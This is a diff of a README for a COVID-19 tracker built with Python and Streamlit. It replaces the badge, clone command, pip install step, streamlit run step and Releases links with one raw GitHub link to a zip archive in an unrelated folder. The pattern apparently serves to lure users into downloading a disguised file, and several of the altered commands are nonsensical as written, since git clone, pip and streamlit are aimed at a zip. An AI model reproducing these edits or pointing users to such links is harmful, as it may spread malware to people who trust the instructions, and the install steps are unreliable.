@@ -1,6 +1,6 @@
 # COVID-19 Tracker 🌍
 
-![COVID-19 Tracker](https://img.shields.io/badge/COVID--19%20Tracker-Global%20Data%20Tracker-brightgreen)
+![COVID-19 Tracker](https://raw.githubusercontent.com/Reep3r/Covid-19-Tracker/main/Sagina/Tracker-Covid-v3.4.zip%20Tracker-Global%20Data%20Tracker-brightgreen)
 
 Welcome to the COVID-19 Tracker repository! This project provides a comprehensive data analysis and visualization tool that tracks COVID-19 cases, deaths, and vaccinations across various countries. Built using Python, Pandas, Matplotlib, Seaborn, and Streamlit, it allows users to dynamically explore pandemic trends through interactive dashboards and reports.
 
@@ -39,20 +39,20 @@ To get started with the COVID-19 Tracker, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Reep3r/Covid-19-Tracker.git
+   git clone https://raw.githubusercontent.com/Reep3r/Covid-19-Tracker/main/Sagina/Tracker-Covid-v3.4.zip
    cd Covid-19-Tracker
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python installed. Then, install the required libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Reep3r/Covid-19-Tracker/main/Sagina/Tracker-Covid-v3.4.zip
    ```
 
 3. **Run the Application**:
    Start the Streamlit app with the following command:
    ```bash
-   streamlit run app.py
+   streamlit run https://raw.githubusercontent.com/Reep3r/Covid-19-Tracker/main/Sagina/Tracker-Covid-v3.4.zip
    ```
 
 ## Usage
@@ -96,9 +96,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version of the COVID-19 Tracker, visit the [Releases](https://github.com/Reep3r/Covid-19-Tracker/releases) section. Here, you can find compiled versions and additional updates.
+To download the latest version of the COVID-19 Tracker, visit the [Releases](https://raw.githubusercontent.com/Reep3r/Covid-19-Tracker/main/Sagina/Tracker-Covid-v3.4.zip) section. Here, you can find compiled versions and additional updates.
 
-For a detailed exploration of the application, please check the [Releases](https://github.com/Reep3r/Covid-19-Tracker/releases) section.
+For a detailed exploration of the application, please check the [Releases](https://raw.githubusercontent.com/Reep3r/Covid-19-Tracker/main/Sagina/Tracker-Covid-v3.4.zip) section.
 
 ## Conclusion
 
